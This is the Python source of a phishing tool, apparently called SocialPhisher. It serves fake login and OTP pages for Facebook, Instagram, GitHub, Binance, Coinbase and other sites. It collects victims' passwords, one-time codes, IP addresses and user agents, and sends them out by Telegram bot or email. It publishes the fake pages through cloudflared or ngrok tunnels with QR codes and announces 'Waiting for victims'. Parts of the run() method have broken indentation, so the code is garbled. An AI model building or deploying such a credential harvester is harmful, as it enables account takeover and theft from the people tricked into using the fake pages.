#!/usr/bin/env python3

import os
import json
import datetime
import subprocess
import requests
import qrcode
from flask import Flask, request, render_template, redirect, session, jsonify
from rich.console import Console
from rich.prompt import Prompt
from rich.panel import Panel
import threading
import time
import socket
import select
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from jinja2 import FileSystemLoader
import re
from rich.table import Table
from rich.layout import Layout
from rich.panel import Panel
from rich.text import Text
from rich import box

console = Console()

class SocialPhisher:
    def __init__(self):
        self.templates_base = os.path.join(os.path.dirname(os.path.dirname(__file__)), 'templates')
        self.app = Flask(__name__, 
                        template_folder=self.templates_base,
                        static_folder=os.path.join(os.path.dirname(os.path.dirname(__file__)), 'static'))
        self.app.secret_key = os.urandom(24)  # For session management
        self.templates_dir = os.path.join(self.templates_base, 'social')
        self.output_dir = 'output/harvested'
        self.qr_dir = 'output/qrcodes'
        self.harvested_data = []
        self.settings = {}
        self.selected_platform = None  # Track the selected platform
        self._ensure_directories()
        self.setup_routes()
        self.server_thread = None
        self.cloudflared_process = None
        self.ngrok_process = None
        self.use_otp = False
        
        # Register template directory
        self.app.jinja_loader = FileSystemLoader(self.templates_base)

    def _ensure_directories(self):
        """Ensure all required directories exist."""
        # Create main directories
        os.makedirs(self.templates_dir, exist_ok=True)
        os.makedirs(self.output_dir, exist_ok=True)
        os.makedirs(self.qr_dir, exist_ok=True)
        
        # Create platform-specific directories for all supported platforms
        platforms = [
            'facebook', 'instagram', 'twitter', 'linkedin', 'tiktok', 'snapchat',
            'github', 'binance', 'telegram', 'pinterest', 'reddit', 'coinbase'
        ]
        for platform in platforms:
            platform_dir = os.path.join(self.templates_dir, platform)
            os.makedirs(platform_dir, exist_ok=True)
            # Ensure index.html exists
            index_file = os.path.join(platform_dir, 'index.html')
            if not os.path.exists(index_file):
                console.print(f"[yellow]Warning: {index_file} template missing[/yellow]")

    def setup_routes(self):
        """Setup Flask routes."""
        
        @self.app.route('/')
        def index():
            platform = request.args.get('platform')
            template_type = request.args.get('type', 'index')  # Can be 'index' or 'otp'
            
            # If we have a selected platform and no platform in URL, use the selected one
            if not platform and self.selected_platform:
                platform = self.selected_platform
            
            if not platform:
                # Show a list of available platforms instead of error
                platforms = [
                    'facebook', 'instagram', 'twitter', 'linkedin', 'tiktok', 'snapchat',
                    'github', 'binance', 'telegram', 'pinterest', 'reddit', 'coinbase', 'messenger'
                ]
                return render_template('social/error.html', 
                                    error="Select a Platform",
                                    message="Available platforms: " + ", ".join(platforms))
            
            try:
                # Construct template path based on type
                template_path = f'social/{platform}/{template_type}.html'
                
                # Check if template exists
                if not os.path.exists(os.path.join(self.templates_base, template_path)):
                    return render_template('social/error.html',
                                        error=f"Template '{template_path}' not found",
                                        message="The requested template is not available.")
                
                # Store the platform if it's valid and we don't have one selected yet
                if not self.selected_platform:
                    self.selected_platform = platform
                
                # Render the template
                return render_template(template_path, platform=platform)
                
            except Exception as e:
                console.print(f"[red]Error loading template: {str(e)}[/red]")
                return render_template('social/error.html',
                                    error="Internal Server Error",
                                    message=str(e))

        @self.app.route('/social/<platform>/<template>', methods=['GET'])
        def serve_social_template(platform, template):
            try:
                # Handle both cases: with and without .html extension
                if not template.endswith('.html'):
                    template += '.html'
                
                template_path = f'social/{platform}/{template}'
                
                # Check if template exists
                template_file = os.path.join(self.templates_base, template_path)
                if not os.path.exists(template_file):
                    return render_template('social/error.html',
                                        error=f"Template '{template_path}' not found",
                                        message="The requested template is not available.")
                
                # Store the platform
                self.selected_platform = platform
                
                # Get user data from query parameters or session
                user_data = {
                    'email': request.args.get('email') or session.get('user_email', '')
                }
                
                # Render the template with user data
                return render_template(template_path, platform=platform, user_data=user_data)
                
            except Exception as e:
                console.print(f"[red]Error loading template: {str(e)}[/red]")
                return render_template('social/error.html',
                                    error="Internal Server Error",
                                    message=str(e))

        @self.app.route('/login', methods=['POST'])
        def login():
            platform = request.args.get('platform')
            if not platform:
                return jsonify({"error": "No platform specified"}), 400
                
            data = request.form.to_dict()
            data['platform'] = platform
            data['timestamp'] = datetime.datetime.now().isoformat()
            data['ip'] = request.remote_addr
            data['user_agent'] = request.headers.get('User-Agent')
            
            # Process the harvested data
            self.process_harvested_data(data, platform)
            
            # Get the email/username for displaying on OTP page
            user_identifier = data.get('email', data.get('username', data.get('login', '')))
            
            # Store email in session
            session['user_email'] = user_identifier
            
            # Return OTP template info with user data
            return jsonify({
                'status': 'success',
                'require_otp': True,
                'otp_template': f'social/{platform}/otp.html',
                'user_data': {
                    'email': user_identifier
                }
            })

        @self.app.route('/verify', methods=['POST'])
        def verify():
            try:
                platform = request.args.get('platform', 'unknown')
                data = request.get_json() if request.is_json else request.form.to_dict()
                
                if not data:
                    return jsonify({'status': 'error', 'message': 'No data received'})
                
                # Add platform info to the data
                data['platform'] = platform
                data['timestamp'] = datetime.datetime.now().isoformat()
                data['ip'] = request.remote_addr
                data['user_agent'] = request.headers.get('User-Agent')
                
                # Process the OTP data
                self.process_harvested_data(data, platform)
                
                # Get the appropriate redirect URL
                redirect_url = self.get_redirect_url(platform)
                
                # Return JSON response
                return jsonify({
                    'status': 'success',
                    'redirect_url': redirect_url
                })
                
            except Exception as e:
                console.print(f"[red]Error processing OTP: {str(e)}[/red]")
                return jsonify({'status': 'error', 'message': str(e)})

    def get_redirect_url(self, platform):
        """Get the appropriate redirect URL for each platform."""
        redirect_urls = {
            'github': 'https://github.com/login',
            'binance': 'https://accounts.binance.com/en/login',
            'telegram': 'https://web.telegram.org/',
            'linkedin': 'https://www.linkedin.com/login',
            'twitter': 'https://twitter.com/login',
            'tiktok': 'https://www.tiktok.com/login',
            'pinterest': 'https://www.pinterest.com/login',
            'reddit': 'https://www.reddit.com/login',
            'coinbase': 'https://www.coinbase.com/signin',
            'facebook': 'https://www.facebook.com/login',
            'instagram': 'https://www.instagram.com/login',
            'snapchat': 'https://accounts.snapchat.com/accounts/login'
        }
        return redirect_urls.get(platform.lower(), 'https://www.google.com')

    def process_harvested_data(self, data, platform):
        """Process and save harvested credentials."""
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        # Format the data based on type (login or OTP)
        if 'otp' in data:
            # Handle OTP data
            message = f"""
[OTP] {platform.upper()} - {timestamp}
OTP Code: {data['otp']}
--------------------------------------------------"""
            console.print(f"[green]✓ Received OTP from {platform.upper()}![/green]")
        else:
            # Handle login credentials
            email = data.get('email', data.get('username', data.get('login', '')))
            password = data.get('password', '')
            message = f"""
[LOGIN] {platform.upper()} - {timestamp}
Email/Username: {email}
Password: {password}
--------------------------------------------------"""
            console.print(f"[green]✓ Received login credentials from {platform.upper()}![/green]")

        # Save to file
        self.save_to_file(message)
        console.print("[blue]→ Saved to file[/blue]")

        # Send to Telegram if configured
        if self.settings.get('output_method') == 'telegram' and self.settings.get('telegram_bot_token'):
            self.send_to_telegram(message)
            console.print("[blue]→ Sent to Telegram[/blue]")

        # Send email if configured
        if self.settings.get('output_method') == 'email' and self.settings.get('email_address'):
            subject = f"{platform.upper()} {'OTP' if 'otp' in data else 'Credentials'} Captured"
            self.send_email_notification(subject, message)
            console.print("[blue]→ Sent to Email[/blue]")

        return {'status': 'success'}

    def save_to_file(self, data):
        """Save data to file."""
        filename = os.path.join('output', 'harvested', 'social_credentials.txt')
        os.makedirs(os.path.dirname(filename), exist_ok=True)
        
        with open(filename, 'a') as f:
            f.write(data)

    def send_to_telegram(self, message):
        """Send data to Telegram."""
        bot_token = self.settings.get('telegram_bot_token')
        chat_id = self.settings.get('telegram_chat_id')
        
        if not bot_token or not chat_id:
            return
        
        url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
        data = {
            'chat_id': chat_id,
            'text': message,
            'parse_mode': 'HTML'
        }
        
        try:
            requests.post(url, json=data)
        except Exception as e:
            console.print(f"[red]Failed to send to Telegram: {str(e)}[/red]")

    def send_email_notification(self, subject, body):
        """Send data via email."""
        smtp_server = self.settings.get('email_smtp_server')
        smtp_port = self.settings.get('email_smtp_port')
        email = self.settings.get('email_address')
        password = self.settings.get('email_password')
        notification_email = self.settings.get('notification_email')
        
        if not all([smtp_server, smtp_port, email, password, notification_email]):
            return
        
        try:
            msg = MIMEMultipart()
            msg['Subject'] = subject
            msg['From'] = email
            msg['To'] = notification_email
            msg.attach(MIMEText(body, 'plain'))
            
            with smtplib.SMTP(smtp_server, smtp_port) as server:
                server.starttls()
                server.login(email, password)
                server.send_message(msg)
        except Exception as e:
            console.print(f"[red]Failed to send email: {str(e)}[/red]")

    def generate_qr_code(self, url, platform):
        """Generate and display QR code for the phishing URL."""
        qr = qrcode.QRCode(
            version=1,
            error_correction=qrcode.constants.ERROR_CORRECT_H,
            box_size=10,
            border=2,
        )
        qr.add_data(url)
        qr.make(fit=True)

        # Save QR code
        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        output_path = os.path.join(self.qr_dir, f'social_{platform}_{timestamp}.png')
        qr_image = qr.make_image(fill_color="black", back_color="white")
        qr_image.save(output_path, quality=95)

        # Display in console
        console.print("\n[bold white]QR code saved and available at:[/bold white]")
        console.print(f"[green]{output_path}[/green]\n")

        # Display cute mini QR code in terminal
        console.print("\n[bold cyan]╭─[bright_yellow] Mini QR Code [/bright_yellow]─╮[/bold cyan]")
        
        # Create a smaller QR code for terminal display
        mini_qr = qrcode.QRCode(
            version=1,
            error_correction=qrcode.constants.ERROR_CORRECT_L,
            box_size=1,
            border=1
        )
        mini_qr.add_data(url)
        mini_qr.make(fit=True)
        
        # Get QR code matrix
        matrix = mini_qr.get_matrix()
        
        # Custom characters for better visibility
        for i in range(0, len(matrix), 2):
            line = "[bold cyan]│[/bold cyan] "
            for j in range(len(matrix[i])):
                if i + 1 < len(matrix):
                    # Combine two rows using half-blocks
                    top = matrix[i][j]
                    bottom = matrix[i + 1][j] if i + 1 < len(matrix) else False
                    if top and bottom:
                        line += "[bright_white]█[/bright_white]"
                    elif top:
                        line += "[bright_white]▀[/bright_white]"
                    elif bottom:
                        line += "[bright_white]▄[/bright_white]"
                    else:
                        line += "[black] [/black]"
                else:
                    # Handle last row if matrix has odd number of rows
                    line += "[bright_white]▀[/bright_white]" if matrix[i][j] else "[black] [/black]"
            line += " [bold cyan]│[/bold cyan]"
            console.print(line)
            
        console.print("[bold cyan]╰" + "─" * (len(matrix) + 2) + "╯[/bold cyan]")
        console.print("[dim]Scan with your phone's camera[/dim]\n")

    def start_server(self, host='0.0.0.0', port=8080):
        """Start the Flask server."""
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.bind((host, port))
                s.close()
            
            console.print(f"[green]Starting server on {host}:{port}...[/green]")
            self.app.run(host=host, port=port, debug=False)
        except Exception as e:
            console.print(f"[red]Failed to start server: {str(e)}[/red]")
            raise e

    def monitor_connection(self, tunnel_type):
        """Monitor tunnel connection and show status."""
        status_text = Text()
        status_text.append("Tunnel Status: ", style="bold")
        
        while True:
            try:
                if tunnel_type == "cloudflared":
                    if self.cloudflared_process and self.cloudflared_process.poll() is None:
                        status_text.append("●", style="green")
                        status_text.append(" Connected", style="green")
                    else:
                        status_text.append("●", style="red")
                        status_text.append(" Disconnected", style="red")
                else:  # ngrok
                    try:
                        requests.get('http://127.0.0.1:4040/api/tunnels')
                        status_text.append("●", style="green")
                        status_text.append(" Connected", style="green")
                    except:
                        status_text.append("●", style="red")
                        status_text.append(" Disconnected", style="red")
                
                # Clear previous line and show new status
                console.print("\033[A\033[K", end="")
                console.print(status_text)
                status_text.clear()
                status_text.append("Tunnel Status: ", style="bold")
                
            except Exception:
                pass
            
            time.sleep(1)

    def start_cloudflared(self, port, platform, platform_module=None):
        """Start cloudflared tunnel with improved stability."""
        try:
            console.print("[yellow]Initializing cloudflared tunnel...[/yellow]")
            
            # Use provided platform module or import it
            if platform_module is None:
                import platform as platform_module
            
            # Windows-specific cleanup
            if platform_module.system() == "Windows":
                try:
                    cleanup_commands = [
                        'taskkill /F /IM cloudflared.exe 2>nul',
                        'del /F /Q "%USERPROFILE%\\.cloudflared\\config.yml" 2>nul'
                    ]
                    for cmd in cleanup_commands:
                        subprocess.run(cmd, shell=True, stderr=subprocess.DEVNULL)
                except Exception as e:
                    console.print(f"[yellow]Warning during Windows cleanup: {str(e)}[/yellow]")
            else:
                try:
                    # Unix cleanup
                    cleanup_commands = [
                        ['pkill', '-9', 'cloudflared'],
                        ['killall', '-9', 'cloudflared'],
                        ['rm', '-f', '/tmp/.cloudflared.lock'],
                        ['rm', '-f', '~/.cloudflared/config.yml']
                    ]
                    for cmd in cleanup_commands:
                        subprocess.run(cmd, stderr=subprocess.DEVNULL)
                except Exception as e:
                    console.print(f"[yellow]Warning during Unix cleanup: {str(e)}[/yellow]")
            
            time.sleep(2)
            
            # Check if cloudflared is installed
            try:
                version_check = subprocess.run(['cloudflared', '--version'], 
                                            capture_output=True, 
                                            text=True)
                console.print(f"[green]Using Cloudflared version: {version_check.stdout.strip()}[/green]")
            except FileNotFoundError:
                console.print("[yellow]Cloudflared not found. Attempting to install...[/yellow]")
                try:
                    if platform_module.system() == "Windows":
                        # Download Windows binary
                        console.print("[yellow]Downloading cloudflared for Windows...[/yellow]")
                        download_url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe"
                        try:
                            import urllib.request
                            urllib.request.urlretrieve(download_url, 'cloudflared.exe')
                        except Exception as e:
                            console.print(f"[red]Failed to download cloudflared: {str(e)}[/red]")
                            return False
                        # Add current directory to PATH
                        os.environ['PATH'] = f"{os.getcwd()};{os.environ['PATH']}"
                    elif os.path.exists('/usr/bin/apt'):
                        subprocess.run(['sudo', 'apt', 'update'], check=True)
                        subprocess.run(['sudo', 'apt', 'install', '-y', 'cloudflared'], check=True)
                    elif os.path.exists('/data/data/com.termux/files/usr/bin/pkg'):
                        subprocess.run(['pkg', 'update'], check=True)
                        subprocess.run(['pkg', 'install', '-y', 'cloudflared'], check=True)
                    else:
                        console.print("[yellow]Downloading cloudflared binary...[/yellow]")
                        subprocess.run([
                            'curl', '-Lo', './cloudflared',
                            'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64'
                        ], check=True)
                        subprocess.run(['chmod', '+x', './cloudflared'], check=True)
                        os.environ['PATH'] = f"{os.getcwd()}:{os.environ['PATH']}"
                except Exception as e:
                    console.print(f"[red]Failed to install cloudflared: {str(e)}[/red]")
                    return False
            
            # Start cloudflared with improved parameters
            console.print("[yellow]Starting cloudflared service...[/yellow]")
            
            # Use different command format for Windows
            if platform_module.system() == "Windows":
                command = [
                    os.path.join(os.getcwd(), 'cloudflared.exe') if os.path.exists('cloudflared.exe') else 'cloudflared',
                    'tunnel',
                    '--url', f'http://127.0.0.1:{port}',
                    '--metrics', '127.0.0.1:0',
                    '--no-autoupdate'
                ]
            else:
                command = [
                    'cloudflared', 'tunnel',
                    '--url', f'http://127.0.0.1:{port}',
                    '--metrics', '127.0.0.1:0',
                    '--no-autoupdate'
                ]
            
            # Create process with appropriate flags for Windows
            startupinfo = None
            if platform_module.system() == "Windows":
                startupinfo = subprocess.STARTUPINFO()
                startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
                startupinfo.wShowWindow = subprocess.SW_HIDE
            
            process = subprocess.Popen(
                command,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                universal_newlines=True,
                bufsize=1,
                startupinfo=startupinfo,
                creationflags=subprocess.CREATE_NO_WINDOW if platform_module.system() == "Windows" else 0
            )
            
            # Monitor for URL
            start_time = time.time()
            timeout = 30
            url_found = False
            output_buffer = []
            
            console.print("[yellow]Waiting for tunnel to be established...[/yellow]")
            
            while (time.time() - start_time) < timeout and not url_found:
                if process.poll() is not None:
                    error = process.stderr.readline().strip() if process.stderr else "Unknown error"
                    console.print(f"[red]Cloudflared process terminated unexpectedly: {error}[/red]")
                    break
                
                # Read output
                for pipe in [process.stdout, process.stderr]:
                    try:
                        line = pipe.readline().strip()
                        if line:
                            output_buffer.append(line)
                            if pipe == process.stderr and "error" in line.lower():
                                console.print(f"[yellow]Cloudflared message: {line}[/yellow]")
                            elif "trycloudflare.com" in line or ".trycloudflare.com" in line:
                                # Extract URL using regex to be more robust
                                url_match = re.search(r'https?://[^\s|\]]+\.trycloudflare\.com', line)
                                if url_match:
                                    url = url_match.group(0)
                                    # Append platform parameter
                                    url = f"{url}?platform={platform}"
                                    
                                    # Display success message
                                    console.print("\n[bold green]═══════════════════════════════════════[/bold green]")
                                    console.print(f"[bold green]Tunnel URL: {url}[/bold green]")
                                    console.print("[bold green]═══════════════════════════════════════[/bold green]\n")
                                    
                                    # Generate QR code
                                    self.generate_qr_code(url, platform)
                                    
                                    self.cloudflared_process = process
                                    url_found = True
                                    
                                    # Display waiting message
                                    console.print("\n[bold yellow]Server is running. Waiting for victims...[/bold yellow]")
                                    console.print("[bold yellow]Press Ctrl+C to stop the server[/bold yellow]\n")
                                    return True
                    except Exception as e:
                        console.print(f"[yellow]Error reading output: {str(e)}[/yellow]")
                        continue
                
                time.sleep(0.1)
            
            # If we get here without finding a URL, show debug info
            if not url_found:
                console.print("[red]Failed to establish cloudflared tunnel. Debug information:[/red]")
                console.print("[yellow]Last few lines of output:[/yellow]")
                for line in output_buffer[-5:]:
                    console.print(f"[dim]{line}[/dim]")
            
            if process.poll() is None:
                process.terminate()
            return False
            
        except Exception as e:
            console.print(f"[red]Error in cloudflared tunnel: {str(e)}[/red]")
            if 'process' in locals() and process.poll() is None:
                process.terminate()
            return False

    def configure_ngrok(self):
        """Configure ngrok with the saved token."""
        if self.settings.get('ngrok_token'):
            try:
                subprocess.run(['ngrok', 'config', 'add-authtoken', self.settings['ngrok_token']], 
                             capture_output=True,
                             text=True)
                console.print("[green]Ngrok configured with saved token[/green]")
                return True
            except Exception as e:
                console.print(f"[red]Error configuring ngrok: {str(e)}[/red]")
                return False
        return False

    def start_ngrok(self, port, platform, platform_module=None):
        """Start ngrok tunnel with improved stability."""
        try:
            console.print("[yellow]Initializing ngrok tunnel...[/yellow]")
            
            # Use provided platform module or import it
            if platform_module is None:
                import platform as platform_module
            
            # Configure ngrok with saved token
            self.configure_ngrok()
            
            # Windows-specific cleanup
            if platform_module.system() == "Windows":
                try:
                    cleanup_commands = [
                        'taskkill /F /IM ngrok.exe 2>nul'
                    ]
                    for cmd in cleanup_commands:
                        subprocess.run(cmd, shell=True, stderr=subprocess.DEVNULL)
                except Exception as e:
                    console.print(f"[yellow]Warning during Windows cleanup: {str(e)}[/yellow]")
            else:
                try:
                    # Unix cleanup
                    cleanup_commands = [
                        ['pkill', '-9', 'ngrok'],
                        ['killall', '-9', 'ngrok']
                    ]
                    for cmd in cleanup_commands:
                        subprocess.run(cmd, stderr=subprocess.DEVNULL)
                except Exception as e:
                    console.print(f"[yellow]Warning during Unix cleanup: {str(e)}[/yellow]")
            
            time.sleep(2)
            
            # Check if ngrok exists, if not download it
            if platform_module.system() == "Windows" and not os.path.exists('ngrok.exe'):
                console.print("[yellow]Downloading ngrok for Windows...[/yellow]")
                try:
                    # Download using urllib instead of curl
                    import urllib.request
                    download_url = "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-windows-amd64.zip"
                    try:
                        urllib.request.urlretrieve(download_url, 'ngrok.zip')
                    except Exception as e:
                        console.print(f"[red]Failed to download ngrok: {str(e)}[/red]")
                        return False
                    
                    # Extract using zipfile
                    try:
                        import zipfile
                        with zipfile.ZipFile('ngrok.zip', 'r') as zip_ref:
                            zip_ref.extractall('.')
                        os.remove('ngrok.zip')
                    except Exception as e:
                        console.print(f"[red]Failed to extract ngrok: {str(e)}[/red]")
                        if os.path.exists('ngrok.zip'):
                            os.remove('ngrok.zip')
                        return False
                    
                    # Add current directory to PATH
                    os.environ['PATH'] = f"{os.getcwd()};{os.environ['PATH']}"
                except Exception as e:
                    console.print(f"[red]Failed to setup ngrok: {str(e)}[/red]")
                    return False
            
            # Start ngrok with improved parameters
            command = [
                os.path.join(os.getcwd(), 'ngrok.exe') if platform_module.system() == "Windows" else 'ngrok',
                'http',
                '--log=stdout',
                str(port)
            ]
            
            # Create process with appropriate flags for Windows
            startupinfo = None
            if platform_module.system() == "Windows":
                startupinfo = subprocess.STARTUPINFO()
                startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
                startupinfo.wShowWindow = subprocess.SW_HIDE
            
            process = subprocess.Popen(
                command,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                universal_newlines=True,
                bufsize=1,
                startupinfo=startupinfo,
                creationflags=subprocess.CREATE_NO_WINDOW if platform_module.system() == "Windows" else 0
            )
            
            # Monitor for URL
            start_time = time.time()
            timeout = 30
            url_found = False
            error_count = 0
            max_errors = 5
            
            console.print("[yellow]Waiting for tunnel to be established...[/yellow]")
            
            while (time.time() - start_time) < timeout and not url_found and error_count < max_errors:
                try:
                    # Check if process is still running
                    if process.poll() is not None:
                        error = process.stderr.readline().strip() if process.stderr else "Unknown error"
                        console.print(f"[red]Ngrok process terminated unexpectedly: {error}[/red]")
                        break

                    # Try to get tunnel info
                    response = requests.get('http://127.0.0.1:4040/api/tunnels', timeout=1)
                    if response.status_code == 200:
                        tunnels = response.json()['tunnels']
                        if tunnels:
                            url = tunnels[0]['public_url']
                            # Append platform parameter
                            url = f"{url}?platform={platform}"
                            
                            # Display success message
                            console.print("\n[bold green]═══════════════════════════════════════[/bold green]")
                            console.print(f"[bold green]Tunnel URL: {url}[/bold green]")
                            console.print("[bold green]═══════════════════════════════════════[/bold green]\n")
                            
                            # Generate QR code
                            self.generate_qr_code(url, platform)
                            
                            self.ngrok_process = process
                            url_found = True
                            
                            # Display waiting message
                            console.print("\n[bold yellow]Server is running. Waiting for victims...[/bold yellow]")
                            console.print("[bold yellow]Press Ctrl+C to stop the server[/bold yellow]\n")
                            return True
                            
                except requests.exceptions.RequestException:
                    # Read process output for potential errors
                    try:
                        output = process.stdout.readline().strip()
                        if output:
                            if "error" in output.lower():
                                console.print(f"[red]Ngrok error: {output}[/red]")
                                error_count += 1
                    except Exception as e:
                        console.print(f"[yellow]Error reading ngrok output: {str(e)}[/yellow]")
                    time.sleep(1)
                    continue
                except Exception as e:
                    console.print(f"[yellow]Error checking ngrok status: {str(e)}[/yellow]")
                    error_count += 1
                    time.sleep(1)
                    continue
            
            # If we get here without finding a URL, cleanup and show error
            if not url_found:
                if error_count >= max_errors:
                    console.print("[red]Too many errors occurred while trying to establish ngrok tunnel.[/red]")
                else:
                    console.print("[red]Failed to establish ngrok tunnel. Please check your internet connection and ngrok configuration.[/red]")
            if process.poll() is None:
                process.terminate()
            return False
            
        except Exception as e:
            console.print(f"[red]Error in ngrok tunnel: {str(e)}[/red]")
            if 'process' in locals() and process.poll() is None:
                process.terminate()
            return False

    def stop_tunnels(self):
        """Stop all running tunnels."""
        if self.cloudflared_process:
            self.cloudflared_process.terminate()
            self.cloudflared_process = None
        if self.ngrok_process:
            self.ngrok_process.terminate()
            self.ngrok_process = None

    def load_settings(self):
        """Load settings from config file."""
        try:
            config_file = os.path.join('config', 'landing_settings.json')
            if os.path.exists(config_file):
                with open(config_file, 'r') as f:
                    self.settings = json.load(f)
                console.print("[green]Settings loaded successfully[/green]")
            else:
                console.print("[yellow]No settings file found, using defaults[/yellow]")
                self.settings = {
                    'output_method': 'file',
                    'output_file': os.path.join('output', 'harvested', 'social_credentials.txt')
                }
        except Exception as e:
            console.print(f"[red]Error loading settings: {str(e)}[/red]")
            self.settings = {
                'output_method': 'file',
                'output_file': os.path.join('output', 'harvested', 'social_credentials.txt')
            }

    def configure_output(self):
        """Configure output methods based on settings."""
        output_method = self.settings.get('output_method', 'file')
        
        if output_method == 'telegram':
            if not self.settings.get('telegram_bot_token') or not self.settings.get('telegram_chat_id'):
                console.print("[yellow]Telegram settings incomplete, falling back to file output[/yellow]")
                self.settings['output_method'] = 'file'
            else:
                console.print("[green]Telegram output configured[/green]")
        
        elif output_method == 'email':
            required_fields = ['email_smtp_server', 'email_smtp_port', 'email_address', 
                             'email_password', 'notification_email']
            if not all(self.settings.get(field) for field in required_fields):
                console.print("[yellow]Email settings incomplete, falling back to file output[/yellow]")
                self.settings['output_method'] = 'file'
            else:
                console.print("[green]Email output configured[/green]")
        
        console.print(f"[blue]Output method: {self.settings['output_method']}[/blue]")

    def _wait_for_server(self, port, timeout=10):
        """Wait for the server to start."""
        start_time = time.time()
        while time.time() - start_time < timeout:
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.connect(('localhost', port))
                    return True
            except:
                time.sleep(0.1)
        return False

    def _find_available_port(self, start_port=8080, max_attempts=100):
        """Find an available port to use."""
        port = start_port
        while port < start_port + max_attempts:
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.bind(('', port))
                    return port
            except OSError:
                port += 1
        raise RuntimeError("No available ports found")

    def run(self):
        """Run the social phishing module."""
        try:
            # Load settings first
            self.load_settings()
            
            # Show platform options in a 2-row table format
            table = Table(
                title="[bold red]Available Social Media Platforms[/bold red]",
                show_header=True,
                header_style="bold magenta",
                box=box.DOUBLE_EDGE,
                border_style="bright_green",
                padding=(1, 2)
            )
            
            # Create columns for better layout
            table.add_column("[cyan]ID[/cyan]", style="cyan", justify="center", width=6)
            table.add_column("[green]Platform[/green]", style="green", width=20)
            table.add_column("[cyan]ID[/cyan]", style="cyan", justify="center", width=6)
            table.add_column("[green]Platform[/green]", style="green", width=20)
            
            # Define platforms in two rows with better organization
            platforms = [
                ("1", "Facebook", "7", "Binance"),
                ("2", "Instagram", "8", "Telegram"),
                ("3", "Twitter", "9", "Pinterest"),
                ("4", "TikTok", "10", "Reddit"),
                ("5", "Snapchat", "11", "Coinbase"),
                ("6", "GitHub", "12", "LinkedIn")
            ]
            
            # Add platforms to table in two columns with improved styling
            for row in platforms:
                table.add_row(
                    f"[bold cyan]{row[0]}[/bold cyan]",
                    f"[bright_green]{row[1]}[/bright_green]",
                    f"[bold cyan]{row[2]}[/bold cyan]",
                    f"[bright_green]{row[3]}[/bright_green]"
                )
            
            # Create a panel with the table
            panel = Panel(
                table,
                title="[bold yellow]≫ Select Your Target ≪[/bold yellow]",
                border_style="bright_green",
                box=box.HEAVY_EDGE,
                padding=(1, 2)
            )
            
            # Print the panel
            console.print("\n")
            console.print(panel)
            console.print("\n")
            
            # Platform selection with improved validation and error handling
            while True:
                try:
                    choice = Prompt.ask(
                        "[bold green]Select platform ID[/bold green]",
                        choices=[str(i) for i in range(1, 13)],
                        show_choices=False
                    )
        
        # Map choices to platform names
        platform_map = {
            "1": "facebook",
            "2": "instagram",
            "3": "twitter",
            "4": "tiktok",
            "5": "snapchat",
            "6": "github",
            "7": "binance",
            "8": "telegram",
            "9": "pinterest",
            "10": "reddit",
            "11": "coinbase",
            "12": "linkedin"
        }
        
        self.selected_platform = platform_map[choice]
                    console.print(f"\n[bold green]Selected platform: {self.selected_platform.upper()}[/bold green]")
                    break
                    
                except KeyboardInterrupt:
                    raise
                except Exception as e:
                    console.print("[red]Invalid choice. Please enter a number between 1 and 12.[/red]")
            
            # Verify template directory exists
            template_dir = os.path.join(self.templates_dir, self.selected_platform)
            if not os.path.exists(template_dir):
                console.print(f"[red]Error: Template directory for {self.selected_platform} not found![/red]")
                return
        
        # Check if OTP template exists and ask user if they want to use it
            otp_template = os.path.join(template_dir, 'otp.html')
        if os.path.exists(otp_template):
            use_otp = Prompt.ask("Enable OTP verification?", choices=["y", "n"], default="n")
            self.use_otp = use_otp.lower() == "y"
            if self.use_otp:
                console.print("[green]OTP verification enabled[/green]")
        
        # Find available port
        port = self._find_available_port()
            if not port:
                console.print("[red]Error: No available ports found![/red]")
                return
                
        console.print(f"[green]Found available port: {port}[/green]")
        
        # Start the Flask server in a separate thread
            try:
        server_thread = threading.Thread(
            target=self.start_server,
            kwargs={'port': port}
        )
        server_thread.daemon = True
        server_thread.start()
        
        # Wait for server to be ready
        if not self._wait_for_server(port):
            console.print("[red]Failed to start server[/red]")
            return
            
        console.print(f"[green]Server started successfully on port {port}[/green]")
        
                # Show tunnel options in a table
                tunnel_table = Table(title="Tunneling Services", show_header=True, header_style="bold magenta")
                tunnel_table.add_column("ID", style="cyan", justify="center")
                tunnel_table.add_column("Service", style="green")
                tunnel_table.add_row("1", "Cloudflared")
                tunnel_table.add_row("2", "Ngrok")
                console.print(tunnel_table)
                
                tunnel_choice = Prompt.ask(
                    "\nChoose tunnel service",
                    choices=["1", "2"],
                    default="1",
                    show_choices=False
                )
                
            if tunnel_choice == "1":
                # Try cloudflared
                console.print("[yellow]Starting Cloudflared tunnel...[/yellow]")
                if self.start_cloudflared(port, self.selected_platform):
                    console.print("[green]Cloudflared tunnel started successfully[/green]")
                    console.print("\n[bold yellow]Server is running. Waiting for victims...[/bold yellow]")
                    console.print("[bold yellow]Press Ctrl+C to stop the server[/bold yellow]\n")
                else:
                    console.print("[red]Failed to start Cloudflared tunnel[/red]")
                    return
            else:
                # Try ngrok
                if not self.start_ngrok(port, self.selected_platform):
                    console.print("[red]Failed to start Ngrok tunnel[/red]")
                    return
                    
            try:
                while True:
                    time.sleep(1)
            except KeyboardInterrupt:
                console.print("\n[yellow]Stopping server...[/yellow]")
                self.stop_tunnels()
                console.print("[green]Server stopped successfully[/green]")
                
        except Exception as e:
                console.print(f"[red]Error starting server: {str(e)}[/red]")
                self.stop_tunnels()
                
        except KeyboardInterrupt:
            console.print("\n[yellow]Operation cancelled by user[/yellow]")
            self.stop_tunnels()
        except Exception as e:
            console.print(f"[red]An error occurred: {str(e)}[/red]")
            self.stop_tunnels() 